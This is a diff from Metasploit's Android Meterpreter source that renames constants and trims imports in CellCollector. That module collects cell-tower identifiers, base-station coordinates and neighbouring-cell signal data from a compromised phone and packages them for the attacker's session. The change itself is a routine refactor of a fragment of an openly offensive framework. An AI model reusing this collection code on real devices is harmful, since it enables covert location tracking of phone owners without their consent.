@@ -1,30 +1,20 @@
 package com.metasploit.meterpreter;
 
-import com.metasploit.meterpreter.android.interval_collect;
+import com.metasploit.meterpreter.android.android_interval_collect;
 
-import android.app.Activity;
 import android.content.Context;
-
-import android.os.Bundle;
 
 import java.io.DataInputStream;
 import java.io.DataOutputStream;
 import java.io.IOException;
 
-import java.lang.InterruptedException;
 import java.lang.Math;
-import java.lang.Override;
-import java.lang.Runnable;
 import java.util.ArrayList;
 import java.util.Collections;
 import java.util.List;
 import java.util.Hashtable;
 
-import android.util.Log;
-
 import android.telephony.NeighboringCellInfo;
-import android.telephony.PhoneStateListener;
-import android.telephony.ServiceState;
 import android.telephony.TelephonyManager;
 import android.telephony.CellLocation;
 import android.telephony.gsm.GsmCellLocation;
@@ -283,23 +273,23 @@ public class CellCollector extends IntervalCollector  {
                 TLVPacket cellSet = new TLVPacket();
                 TLVPacket resultSet = new TLVPacket();
 
-                resultSet.add(interval_collect.TLV_TYPE_COLLECT_RESULT_TIMESTAMP, timestamp / 1000);
+                resultSet.add(android_interval_collect.TLV_TYPE_COLLECT_RESULT_TIMESTAMP, timestamp / 1000);
 
                 switch(result.active.ptype) {
                     case TelephonyManager.PHONE_TYPE_GSM:
-                        activeCell.add(interval_collect.TLV_TYPE_CELL_CID, result.active.gsm.mCid);
-                        activeCell.add(interval_collect.TLV_TYPE_CELL_LAC, result.active.gsm.mLac);
-                        activeCell.add(interval_collect.TLV_TYPE_CELL_PSC, result.active.gsm.mPsc);
-                        cellSet.addOverflow(interval_collect.TLV_TYPE_CELL_ACTIVE_GSM, activeCell);
+                        activeCell.add(android_interval_collect.TLV_TYPE_CELL_CID, result.active.gsm.mCid);
+                        activeCell.add(android_interval_collect.TLV_TYPE_CELL_LAC, result.active.gsm.mLac);
+                        activeCell.add(android_interval_collect.TLV_TYPE_CELL_PSC, result.active.gsm.mPsc);
+                        cellSet.addOverflow(android_interval_collect.TLV_TYPE_CELL_ACTIVE_GSM, activeCell);
                         break;
 
                     case TelephonyManager.PHONE_TYPE_CDMA:
-                        activeCell.add(interval_collect.TLV_TYPE_CELL_BASE_ID, result.active.cdma.mBaseId);
-                        activeCell.add(interval_collect.TLV_TYPE_CELL_BASE_LAT, result.active.cdma.mBaseLat);
-                        activeCell.add(interval_collect.TLV_TYPE_CELL_BASE_LONG, result.active.cdma.mBaseLong);
-                        activeCell.add(interval_collect.TLV_TYPE_CELL_NET_ID, result.active.cdma.mNetId);
-                        activeCell.add(interval_collect.TLV_TYPE_CELL_SYSTEM_ID, result.active.cdma.mSystemId);
-                        cellSet.addOverflow(interval_collect.TLV_TYPE_CELL_ACTIVE_CDMA, activeCell);
+                        activeCell.add(android_interval_collect.TLV_TYPE_CELL_BASE_ID, result.active.cdma.mBaseId);
+                        activeCell.add(android_interval_collect.TLV_TYPE_CELL_BASE_LAT, result.active.cdma.mBaseLat);
+                        activeCell.add(android_interval_collect.TLV_TYPE_CELL_BASE_LONG, result.active.cdma.mBaseLong);
+                        activeCell.add(android_interval_collect.TLV_TYPE_CELL_NET_ID, result.active.cdma.mNetId);
+                        activeCell.add(android_interval_collect.TLV_TYPE_CELL_SYSTEM_ID, result.active.cdma.mSystemId);
+                        cellSet.addOverflow(android_interval_collect.TLV_TYPE_CELL_ACTIVE_CDMA, activeCell);
                         break;
                 }
 
@@ -307,17 +297,17 @@ public class CellCollector extends IntervalCollector  {
                     TLVPacket neighbor = new TLVPacket();
                     CellNeighbor cellNeighbor = result.neighbors.get(i);
 
-                    neighbor.add(interval_collect.TLV_TYPE_CELL_NET_TYPE, cellNeighbor.mType);
-                    neighbor.add(interval_collect.TLV_TYPE_CELL_CID, cellNeighbor.mCid);
-                    neighbor.add(interval_collect.TLV_TYPE_CELL_LAC, cellNeighbor.mLac);
-                    neighbor.add(interval_collect.TLV_TYPE_CELL_PSC, cellNeighbor.mPsc);
+                    neighbor.add(android_interval_collect.TLV_TYPE_CELL_NET_TYPE, cellNeighbor.mType);
+                    neighbor.add(android_interval_collect.TLV_TYPE_CELL_CID, cellNeighbor.mCid);
+                    neighbor.add(android_interval_collect.TLV_TYPE_CELL_LAC, cellNeighbor.mLac);
+                    neighbor.add(android_interval_collect.TLV_TYPE_CELL_PSC, cellNeighbor.mPsc);
                     // Convert signal strength back to negative dBm on the other side
-                    neighbor.add(interval_collect.TLV_TYPE_CELL_RSSI, Math.abs(cellNeighbor.mRssi));
-                    cellSet.addOverflow(interval_collect.TLV_TYPE_CELL_NEIGHBOR, neighbor);
+                    neighbor.add(android_interval_collect.TLV_TYPE_CELL_RSSI, Math.abs(cellNeighbor.mRssi));
+                    cellSet.addOverflow(android_interval_collect.TLV_TYPE_CELL_NEIGHBOR, neighbor);
                 }
 
-                resultSet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_CELL, cellSet);
-                packet.addOverflow(interval_collect.TLV_TYPE_COLLECT_RESULT_GROUP, resultSet);
+                resultSet.addOverflow(android_interval_collect.TLV_TYPE_COLLECT_RESULT_CELL, cellSet);
+                packet.addOverflow(android_interval_collect.TLV_TYPE_COLLECT_RESULT_GROUP, resultSet);
             }
         }
         catch (IOException ex) {
